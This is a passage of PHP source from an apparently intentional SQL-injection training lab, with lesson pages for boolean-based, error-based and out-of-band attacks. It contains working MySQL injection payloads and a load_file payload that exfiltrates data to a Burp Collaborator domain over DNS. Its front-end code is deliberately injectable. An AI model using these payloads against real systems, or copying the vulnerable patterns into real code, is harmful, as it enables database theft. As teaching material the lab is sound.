<?php

class lab extends Controller
{
    private $User;

    public function __construct()
    {
        $this->User = $this->model("User");
    }

    function index()
    {
        http_response_code(403);
        header('Location: /page-error-403.html');
        exit();
    }

    function BooleanBased()
    {
        if (isset($_SESSION["username"])) {
            $title = "Boolean Based SQLi :: GraphSQLi Lab v" . $this->GetVersion();
            $id = "Boolean Based SQLi";
            $MenuHtml = $this->CreateMenuBlocks($id);
            $InfoHtml = $this->GetCurrentInfo($id, "", "");

            $CurrentLevel = htmlspecialchars(strtolower(trim($_COOKIE["lab_level"])));
            $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/boolean-based/{$CurrentLevel}.php"), true);
            $help_body = "";
            if ($CurrentLevel === "low") {
                $help_body = "
                    The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any 
                    SQL query they wish.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND IF(SUBSTR(database(),1,1)='g',true,false)#</span>.</pre>";
            } else if ($CurrentLevel === "medium") {
                $help_body = "The medium level uses a form of SQL injection protection, with the function of " .
                    $this->getExternalHtmlLink('https://www.php.net/manual/en/mysqli.real-escape-string.php', 'mysqli::real_escape_string') . "<br>However due to the 
                    SQL query not having quotes around the parameter, this will not fully
                    protect the query from being altered.<br>
                    The text box has been replaced with a pre-defined dropdown list to submit the form.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1 AND IF(ASCII(SUBSTR(database(),1,1))=103,true,false)#</span>.</pre>";
            } else if ($CurrentLevel === "high") {
                $help_body = "
                    This is very similar to the low level, however this time the attacker is inputting the value
                    in a different manner.
                    The input values are being transferred to the vulnerable query via session variables using
                    another form. <br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND IF(SUBSTR(database(),1,1)='g',true,false)#</span>.</pre>";
            } else if ($CurrentLevel === "impossible") {
                $help_body = "The queries are now parameterized queries (rather than being dynamic). This means the query
                    has been defined by the developer,
                    and has distinguish which sections are code, and the rest is data.";
            }

            $body = "
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Vulnerability: Boolean based SQL Injection</h1>
                            <div class=\"widget-body clearfix\">
                                Boolean based SQL Injection is an inferential SQL Injection technique that relies on sending
                                an SQL query to the database which forces the application to return a different result
                                depending on whether the query returns a TRUE or FALSE result.<br>
                                Depending on the result, the content within the HTTP response will change, or remain the
                                same. This allows an attacker to infer if the payload used returned true or false, even
                                though no data from the database is returned. This attack is typically slow (especially on
                                large databases) since an attacker would need to enumerate a database, character by
                                character.<br>
                                Attackers can test for this by inserting a condition into an SQL query: <pre>https://example.com/index.php?id=1+AND+1=1</pre>
                                If the page loads as usual, it might indicate that it is vulnerable to an SQL Injection. To
                                be sure, an attacker typically tries to provoke a false result using something like
                                this: <pre>https://example.com/index.php?id=1+AND+1=2</pre>
                                Since the condition is false, if no result is returned or the page does not work as usual
                                (missing text or a white page is displayed, for example), it might indicate that the page is
                                vulnerable to an SQL injection.<br>
                                Here is an example of how to extract data in this way: <pre>https://example.com/index.php?id=1+AND+IF(version()+LIKE+'5%',true,false)</pre>
                                With this request, the page should load as usual if the database version is 5.X. But, it will
                                behave differently (display an empty page, for example) if the version is different,
                                indicating whether it it is vulnerable to an SQL injection.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Lab Section</h1>
                            <div class=\"widget-body clearfix\">Objective: Find the name of the SQL database through a Boolean based SQL Injection attack.<br><br> 
            ";

            if ($CurrentLevel === "high") {
                $body .= "
                    <button class=\"btn btn-info ripple\" data-toggle=\"modal\" data-target=\"#changeID-modal\">Click here to change UserID</button>
                    <div id=\"changeID-modal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\" style=\"display: none\">
                         <div class=\"modal-dialog\">
                            <div class=\"modal-content\">
                                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                <div class=\"modal-body\">
                                    <form id=\"changeIdForm\" method=\"POST\">
                                        <div class=\"form-group\">
                                            <label for=\"userid\">UserID</label>
                                            <input class=\"form-control\" type=\"text\" id=\"userId\" required=\"\">
                                        </div>
                                        <div class=\"text-center mr-b-30\">
                                            <button class=\"btn btn-rounded btn-lg btn-success ripple\" id=\"changeIdBtn\" type=\"submit\" value=\"change_id\"'>Change ID</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                         </div>           
                    </div>
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#changeIdForm').submit(function(e) {
                            e.preventDefault();
                            var formDataId = {
                                'id' : document.getElementById('userId').value,
                                'action':  document.getElementById('changeIdBtn').value
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/api/change_id',
                                datatype: 'json',
                                data: JSON.stringify(formDataId),
                                success: function(result)
                                {
                                    if(typeof result.error == \"undefined\"){
                                        $('#changeID-modal').modal('hide');
                                        var formData = {'query' : 'query { user { UserId, FirstName, LastName}}'};
                                        $.ajax({
                                            type: \"POST\",
                                            url: '/lab_api/BooleanBased',
                                            datatype: 'json',
                                            data: JSON.stringify(formData),
                                            success: function(result)
                                            {
                                                if(typeof result.error ==\"undefined\"){
                                                    document.getElementById(\"output\").innerHTML = result.result;
                                                }else{
                                                    document.getElementById(\"output\").innerHTML = result.error.message;
                                                }
                                            }
                                        });
                                    } else{
                                        document.getElementById(\"output\").innerHTML = result.error.message;
                                    }
                                }
                           });
                        });
                    });
                    </script>";
            } else {
                $body .= "
                        <form id=\"searchForm\" method=\"POST\">
                            <div class=\"form-group row\">
                                <label class=\"col-md-1 col-form-label\">User ID:</label>
                                ";
                if ($CurrentLevel === "medium") {
                    $numRow = $this->User->GetAmountUser();
                    $body .= "    <div class=\"col-md-3\"><div class=\"input-group\"><select class=\"form-control\" id=\"searchId\" name=\"id\">";

                    for ($i = 1; $i < $numRow[0] + 1; $i++) {
                        $body .= "<option value=\"{$i}\">{$i}</option>";
                    }
                    $body .= "</select></div></div>";
                } else {
                    $body .= "    <div class=\"col-md-3\"><input id=\"searchId\" class=\"form-control\" name=\"id\"></div>";
                }
                $body .= "\n				<div class=\"col-md-3\"><div class=\"input-group\"><button class=\"btn btn-primary btn-rounded\" type=\"submit\" value=\"Submit\" name=\"Submit\">Submit</button></div></div></div>\n";
                $body .= "
		                    </form>";
                $body .= "
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#searchForm').submit(function(e) {
                            e.preventDefault();
                            var formData = {
                                'query' : 'query { user (id:\"' + document.getElementById('searchId').value + '\"){ UserId, FirstName, LastName}}'
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/lab_api/BooleanBased',
                                datatype: 'json',
                                data: JSON.stringify(formData),
                                success: function(result)
                                {
                                      if(typeof result.error ==\"undefined\"){
                                            document.getElementById(\"output\").innerHTML = result.result;
                                      }else{
                                            document.getElementById(\"output\").innerHTML = result.error.message;
                                      }
                               }
                           });
                         });
                    });
                    </script>
                    ";
            }
            $body .= "            <div class=\"row\">
                                    <div class=\"col-md-3 ml-md-auto btn-list\">
                                        <div class=\"btn-group m-r-10\">
                                            <button aria-expanded=\"false\" data-toggle=\"dropdown\" class=\"btn btn-info dropdown-toggle ripple\" type=\"button\">View Source <span class=\"caret\"></span></button>
                                            <div role=\"menu\" class=\"dropdown-menu\">
                                                <a class=\"dropdown-item\" data-toggle=\"modal\" data-target=\"#viewSourceModal\" >This level</a>  
                                                <a class=\"dropdown-item\" href=\"/view_source_all/BooleanBased\">All level</a>
                                            </div>
                                        </div>
                                        <button data-toggle=\"modal\" data-target=\"#viewHelpModal\" class=\"btn btn-success ripple\" id='\"viewHelpBtn\"'>View Help</button>
                                        <div id=\"viewSourceModal\" class=\"modal modal-info fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalSource\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalSource\">Source code of {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"sourceCode\">{$source_api}</div>
                                                </div> 
                                            </div>
                                        </div>
                                        <div id=\"viewHelpModal\" class=\"modal modal-green fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalHelp\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalHelp\">Help for {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"helpContent\">{$help_body}</div>
                                                </div> 
                                            </div>
                                        </div>
                                    </div>
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
             </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">More Information</h1>
                            <ul>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/#BooleanBasedSQL') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/cheat-sheet') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://owasp.org/www-community/attacks/SQL_Injection') . "</li>
                            </ul>
                        </div>
                        <!-- /.widget-body -->
                    </div>
                    <!-- /.widget-bg -->
                </div>
            </div>  
            ";

            $this->view("page-template", [
                "menu" => $MenuHtml,
                "info" => $InfoHtml,
                "title" => $title,
                "page_body" => $body
            ]);
        } else {
            http_response_code(403);
            header('Location: /page-error-403.html');
            exit();
        }
    }

    function ErrorBased()
    {
        if (isset($_SESSION["username"])) {
            $title = "Error Based SQLi :: GraphSQLi Lab v" . $this->GetVersion();
            $id = "Error Based SQLi";
            $MenuHtml = $this->CreateMenuBlocks($id);
            $InfoHtml = $this->GetCurrentInfo($id, "", "");

            $CurrentLevel = htmlspecialchars(strtolower(trim($_COOKIE["lab_level"])));
            $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/error-based/{$CurrentLevel}.php"), true);
            $help_body = "";
            if ($CurrentLevel === "low") {
                $help_body = "
                    The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any 
                    SQL query they wish.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND extractvalue(rand(),concat(0x3a,database()))#</span>.</pre>";
            } else if ($CurrentLevel === "medium") {
                $help_body = "The medium level uses a form of SQL injection protection, with the function of " .
                    $this->getExternalHtmlLink('https://www.php.net/manual/en/mysqli.real-escape-string.php', 'mysqli::real_escape_string') . "<br>However due to the 
                    SQL query not having quotes around the parameter, this will not fully
                    protect the query from being altered.<br>
                    The text box has been replaced with a pre-defined dropdown list to submit the form.<br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1 AND extractvalue(rand(),concat(0x3a,database()))#</span>.</pre>";
            } else if ($CurrentLevel === "high") {
                $help_body = "
                    This is very similar to the low level, however this time the attacker is inputting the value
                    in a different manner.
                    The input values are being transferred to the vulnerable query via session variables using
                    another form. <br>
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' AND extractvalue(rand(),concat(0x3a,database()))#</span>.</pre>";
            } else if ($CurrentLevel === "impossible") {
                $help_body = "The queries are now parameterized queries (rather than being dynamic). This means the query
                    has been defined by the developer,
                    and has distinguish which sections are code, and the rest is data.";
            }

            $body = "
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Vulnerability: Error based SQL Injection</h1>
                            <div class=\"widget-body clearfix\">
                                Error based SQL Injection is an in-band SQL Injection technique that relies on error messages
                                thrown by the database server to obtain information about the structure of the database. In
                                some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire
                                database. While errors are very useful during the development phase of a web application,
                                they should be disabled on a live site, or logged to a file with restricted access
                                instead.<br>
                                Example: <pre>https://example.com/index.php?id=1' AND extractvalue(rand(),concat(0x3a,version()))#</pre>
                                If database is MySQL version 5.1 or later, this request returned an error: <pre>General error: 1105 XPATH syntax error: ':version_db'</pre>
                                The ExtractValue() function generates a SQL error when it is unable to parse the XML data
                                passed to it. Fortunately, the XML data, and, in our case, the evaluated results of our SQL
                                query, will be be embedded into the subsequent error message. <br>
                                Prepending a full stop or a colon (hex representation of 0x3a) to the beginning of the XML
                                query will ensure the parsing will always fail, thus generating an error with our extracted
                                data.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Lab Section</h1>
                            <div class=\"widget-body clearfix\">Objective: There are 5 users in the database, with id's from 1 to 5. Your mission is steal their
                            passwords via a Error based SQLi attack.<br><br> 
            ";

            if ($CurrentLevel === "high") {
                $body .= "
                    <button class=\"btn btn-info ripple\" data-toggle=\"modal\" data-target=\"#changeID-modal\">Click here to change UserID</button>
                    <div id=\"changeID-modal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\" style=\"display: none\">
                         <div class=\"modal-dialog\">
                            <div class=\"modal-content\">
                                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                <div class=\"modal-body\">
                                    <form id=\"changeIdForm\" method=\"POST\">
                                        <div class=\"form-group\">
                                            <label for=\"userid\">UserID</label>
                                            <input class=\"form-control\" type=\"text\" id=\"userId\" required=\"\">
                                        </div>
                                        <div class=\"text-center mr-b-30\">
                                            <button class=\"btn btn-rounded btn-lg btn-success ripple\" id=\"changeIdBtn\" type=\"submit\" value=\"change_id\"'>Change ID</button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                         </div>           
                    </div>
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#changeIdForm').submit(function(e) {
                            e.preventDefault();
                            var formDataId = {
                                'id' : document.getElementById('userId').value,
                                'action':  document.getElementById('changeIdBtn').value
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/api/change_id',
                                datatype: 'json',
                                data: JSON.stringify(formDataId),
                                success: function(result)
                                {
                                    if(typeof result.error == \"undefined\"){
                                        $('#changeID-modal').modal('hide');
                                        var formData = {'query' : 'query { user { UserId, FirstName, LastName}}'};
                                        $.ajax({
                                            type: \"POST\",
                                            url: '/lab_api/ErrorBased',
                                            datatype: 'json',
                                            data: JSON.stringify(formData),
                                            success: function(result)
                                            {
                                                if(typeof result.error ==\"undefined\"){
                                                    document.getElementById(\"output\").innerHTML = result.result;
                                                }else{
                                                    document.getElementById(\"output\").innerHTML = result.error.message;
                                                }
                                            }
                                        });
                                    } else{
                                        document.getElementById(\"output\").innerHTML = result.error.message;
                                    }
                                }
                           });
                        });
                    });
                    </script>";
            } else {
                $body .= "
                        <form id=\"searchForm\" method=\"POST\">
                            <div class=\"form-group row\">
                                <label class=\"col-md-1 col-form-label\">User ID:</label>
                                ";
                if ($CurrentLevel === "medium") {
                    $numRow = $this->User->GetAmountUser();
                    $body .= "    <div class=\"col-md-3\"><div class=\"input-group\"><select class=\"form-control\" id=\"searchId\" name=\"id\">";

                    for ($i = 1; $i < $numRow[0] + 1; $i++) {
                        $body .= "<option value=\"{$i}\">{$i}</option>";
                    }
                    $body .= "</select></div></div>";
                } else {
                    $body .= "    <div class=\"col-md-3\"><input id=\"searchId\" class=\"form-control\" name=\"id\"></div>";
                }
                $body .= "\n				<div class=\"col-md-3\"><div class=\"input-group\"><button class=\"btn btn-primary btn-rounded\" type=\"submit\" value=\"Submit\" name=\"Submit\">Submit</button></div></div></div>\n";
                $body .= "
		                    </form>";
                $body .= "
                    <p class=\"text-success\" id=\"output\"></p>
                    <script type=\"text/javascript\">
                    $(document).ready(function() {
                        $('#searchForm').submit(function(e) {
                            e.preventDefault();
                            var formData = {
                                'query' : 'query { user (id:\"' + document.getElementById('searchId').value + '\"){ UserId, FirstName, LastName}}'
                            };
                            $.ajax({
                                type: \"POST\",
                                url: '/lab_api/ErrorBased',
                                datatype: 'json',
                                data: JSON.stringify(formData),
                                success: function(result)
                                {
                                      if(typeof result.error ==\"undefined\"){
                                            document.getElementById(\"output\").innerHTML = result.result;
                                      }else{
                                            document.getElementById(\"output\").innerHTML = result.error.message;
                                      }
                               }
                           });
                         });
                    });
                    </script>
                    ";
            }
            $body .= "            <div class=\"row\">
                                    <div class=\"col-md-3 ml-md-auto btn-list\">
                                        <div class=\"btn-group m-r-10\">
                                            <button aria-expanded=\"false\" data-toggle=\"dropdown\" class=\"btn btn-info dropdown-toggle ripple\" type=\"button\">View Source <span class=\"caret\"></span></button>
                                            <div role=\"menu\" class=\"dropdown-menu\">
                                                <a class=\"dropdown-item\" data-toggle=\"modal\" data-target=\"#viewSourceModal\" >This level</a>  
                                                <a class=\"dropdown-item\" href=\"/view_source_all/ErrorBased\">All level</a>
                                            </div>
                                        </div>
                                        <button data-toggle=\"modal\" data-target=\"#viewHelpModal\" class=\"btn btn-success ripple\" id='\"viewHelpBtn\"'>View Help</button>
                                        <div id=\"viewSourceModal\" class=\"modal modal-info fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalSource\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalSource\">Source code of {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"sourceCode\">{$source_api}</div>
                                                </div> 
                                            </div>
                                        </div>
                                        <div id=\"viewHelpModal\" class=\"modal modal-green fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalHelp\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalHelp\">Help for {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"helpContent\">{$help_body}</div>
                                                </div> 
                                            </div>
                                        </div>
                                    </div>
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
             </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">More Information</h1>
                            <ul>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/#ErrorBasedSQL') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-error-based') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/cheat-sheet') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://owasp.org/www-community/attacks/SQL_Injection') . "</li>
                            </ul>
                        </div>
                        <!-- /.widget-body -->
                    </div>
                    <!-- /.widget-bg -->
                </div>
            </div>  
            ";

            $this->view("page-template", [
                "menu" => $MenuHtml,
                "info" => $InfoHtml,
                "title" => $title,
                "page_body" => $body
            ]);
        } else {
            http_response_code(403);
            header('Location: /page-error-403.html');
            exit();
        }
    }

    function OutOfBand()
    {
        if (isset($_SESSION["username"])) {
            $title = "Out of band SQLi :: GraphSQLi Lab v" . $this->GetVersion();
            $id = "Out of band SQLi";
            $MenuHtml = $this->CreateMenuBlocks($id);
            $InfoHtml = $this->GetCurrentInfo($id, "", "");

            $CurrentLevel = htmlspecialchars(strtolower(trim($_COOKIE["lab_level"])));
            $source_api = "";
            if ($CurrentLevel === "impossible") {
                $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/out-of-band/{$CurrentLevel}.php"), true);
            } else {
                $CurrentLevel = "normal";
                $source_api = highlight_string(@file_get_contents(GRAPHSQLI_LAB_ROOT . "mvc/controllers/lab_api_source/out-of-band/normal.php"), true);
            }

            $help_body = "";
            if ($CurrentLevel === "impossible") {
                $help_body = "The queries are now parameterized queries (rather than being dynamic). This means the query
                    has been defined by the developer,
                    and has distinguish which sections are code, and the rest is data.";
            } else {
                $help_body = "The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do
                    is escape the query and then they are able
                    to execute any SQL query they wish.
                    <pre>Sample payload: <span style=\"color: black; background: black;\">id: 1' and load_file(concat('\\\\\\\\\\\\\\\\',version(),'.your_burpcollaborator_payload\\\\\\\\a.txt'))#</span>.</pre>";
            }

            $body = "
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Vulnerability: Out of Band SQL Injection</h1>
                            <div class=\"widget-body clearfix\">
                                Out of Band SQL injection is not very common, mostly because it depends on features being
                                enabled on the database server being used by the web application. Out-of-band SQL injection
                                occurs when an attacker is unable to use the same channel to launch the attack and gather
                                results.<br>
                                Out of band techniques, offer an attacker an alternative to inferential time-based
                                techniques, especially if the server responses are not very stable (making an inferential
                                time-based attack unreliable).<br>
                                Out-of-band SQLi techniques would rely on the database server’s ability to make DNS or HTTP
                                requests to deliver data to an attacker. Such is the case with MySQL's load_file, which can
                                be used to make DNS requests to a server an attacker controls<br>
                                The easiest and most reliable way to use out-of-band techniques is using
                                " . $this->GetExternalHtmlLink('https://portswigger.net/burp/documentation/collaborator', 'Burp Collaborator') . "
                                 This is a server that provides custom implementations of various network services
                                (including DNS), and allows you to detect when network interactions occur as a result of sending
                                individual payloads to a vulnerable application<br>
                                The techniques for triggering a DNS query are highly specific to the type of database being
                                used. On MySQL, input like the following can be used to cause a DNS lookup on
                                a specified domain: <pre>load_file('\\\\\\\\0ef4544h09ywzwakb7v7s837aygq4f.burpcollaborator.net\\\\a.txt')</pre>
                                This will cause the database to perform a lookup for the following domain: <pre>0ef4544h09ywzwakb7v7s837aygq4f.burpcollaborator.net</pre>
                                You can use " . $this->GetExternalHtmlLink('https://portswigger.net/burp/documentation/desktop/tools/collaborator-client', 'Burp Suite\'s Collaborator client') . "
                                to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur. <br>
                                Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band
                                channel to exfiltrate data from the vulnerable application. For example: <pre>load_file(concat('\\\\\\\\',version(),'.0ef4544h09ywzwakb7v7s837aygq4f.burpcollaborator.net\\\\a.txt'))</pre>
                                This input reads the version of database, appends a unique Collaborator
                                subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following,
                                allowing you to view the captured version: <pre>8.0.26.0ef4544h09ywzwakb7v7s837aygq4f.burpcollaborator.net.</pre>
                                <div class=\"text-danger\">
                                Limitations in MySQL:
                                <ul>
                                    <li>Out of band SQLi in MySQL only works if MySQL is deployed on Windows. This due to load_file() function in MySQL on Windows 
                                    implements Windows API CreateFile. This API allows not only access to the files on the machine itself (in this case the server running MySQL), 
                                    but also allows access to files on the network. Which means that when MySQL is running on Windows, it is possible to create a query that sends data over the internet.
                                    <b>So to be able to practice this kind of attack, you must have MySQL deploy on Windows machine.</b></li>
                                    <li>In MySQL there exists a global system variable known as ‘secure_file_priv’. This variable is used to limit
                                    the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT
                                    ... INTO OUTFILE statements and the LOAD_FILE() function</li>
                                    <ul>
                                        <li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. 
                                        The directory must exist, the server will not create it.</li>
                                        <li>If the variable is empty it has no effect, thus insecure configuration</li>
                                        <li>If set to NULL, the server disables import and export operations. This value is permitted as of MySQL 5.5.53</li>
                                    </ul>
                                    <li><b>Which means you must set this value to empty to be able to practice this kind of attack.</b> You can follow the 
                                    instructions in README.md to change the value of secure_file_priv</li>
                                </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">Lab Section</h1>
                            <div class=\"widget-body clearfix\">Objective: There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their
                    passwords via a Out of band SQLi attack.<br><br> 
                             <form id=\"searchForm\" method=\"POST\">
                                <div class=\"form-group row\">
                                    <label class=\"col-md-1 col-form-label\">User ID:</label> 
                                    <div class=\"col-md-3\"><input id=\"searchId\" class=\"form-control\" name=\"id\"></div>
                                    <div class=\"col-md-3\">
                                        <div class=\"input-group\">
                                            <button class=\"btn btn-primary btn-rounded\" type=\"submit\" value=\"Submit\" name=\"Submit\">Submit</button>
                                        </div>
                                    </div>
                                </div>
                             </form>
                            <p class=\"text-success\" id=\"output\"></p>
                            <script type=\"text/javascript\">
                            $(document).ready(function() {
                                $('#searchForm').submit(function(e) {
                                    e.preventDefault();
                                    var formData = {
                                        'query' : 'query { user (id:\"' + document.getElementById('searchId').value + '\"){ UserId, FirstName, LastName}}'
                                    };
                                    $.ajax({
                                        type: \"POST\",
                                        url: '/lab_api/OutOfBand',
                                        datatype: 'json',
                                        data: JSON.stringify(formData),
                                        success: function(result)
                                        {
                                              document.getElementById(\"output\").innerHTML = result.result;
                                       }
                                   });
                                 });
                            });
                            </script>
                            <div class=\"row\">
                                    <div class=\"col-md-3 ml-md-auto btn-list\">
                                        <div class=\"btn-group m-r-10\">
                                            <button aria-expanded=\"false\" data-toggle=\"dropdown\" class=\"btn btn-info dropdown-toggle ripple\" type=\"button\">View Source <span class=\"caret\"></span></button>
                                            <div role=\"menu\" class=\"dropdown-menu\">
                                                <a class=\"dropdown-item\" data-toggle=\"modal\" data-target=\"#viewSourceModal\" >This level</a>  
                                                <a class=\"dropdown-item\" href=\"/view_source_all/OutOfBand\">All level</a>
                                            </div>
                                        </div>
                                        <button data-toggle=\"modal\" data-target=\"#viewHelpModal\" class=\"btn btn-success ripple\" id='\"viewHelpBtn\"'>View Help</button>
                                        <div id=\"viewSourceModal\" class=\"modal modal-info fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalSource\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalSource\">Source code of {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"sourceCode\">{$source_api}</div>
                                                </div> 
                                            </div>
                                        </div>
                                        <div id=\"viewHelpModal\" class=\"modal modal-green fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"modalHelp\" aria-hidden=\"true\" style=\"display: none\">
                                            <div class=\"modal-dialog modal-lg\">
                                                <div class=\"modal-content\" id=\"tab1\">
                                                    <div class=\"modal-header\">
                                                        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">×</button>
                                                        <h5 class=\"modal-title\" id=\"modalHelp\">Help for {$CurrentLevel} level</h5>
                                                    </div>
                                                    <div class=\"modal-body\" id=\"helpContent\">{$help_body}</div>
                                                </div> 
                                            </div>
                                        </div>
                                    </div>
                                 </div>
                            </div>
                        </div>
                    </div>
                </div>
             </div>
            <div class=\"row\">
                <div class=\"col-md-12 widget-holder\">
                    <div class=\"widget-bg\">
                        <div class=\"widget-body clearfix\">
                            <h1 class=\"box-title\">More Information</h1>
                            <ul>
                                <li>" . $this->GetExternalHtmlLink('https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://zenodo.org/record/3556347/files/A%20Study%20of%20Out-of-Band%20SQL%20Injection.pdf') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://portswigger.net/web-security/sql-injection/cheat-sheet') . "</li>
                                <li>" . $this->GetExternalHtmlLink('https://owasp.org/www-community/attacks/SQL_Injection') . "</li>
                            </ul>
                        </div>
                        <!-- /.widget-body -->
                    </div>
                    <!-- /.widget-bg -->
                </div>
            </div> 
            ";

            $this->view("page-template", [
                "menu" => $MenuHtml,
                "info" => $InfoHtml,
                "title" => $title,
                "page_body" => $body
            ]);
        } else {
            http_response_code(403);
            header('Location: /page-error-403.html');
            exit();
        }
    }

    function TimeBased()
    {
        if (isset($_SESSION["username"])) {
            $title = "Time Based SQLi :: GraphSQLi Lab v" . $this->GetVersion();
            $id = "Time Based SQLi";
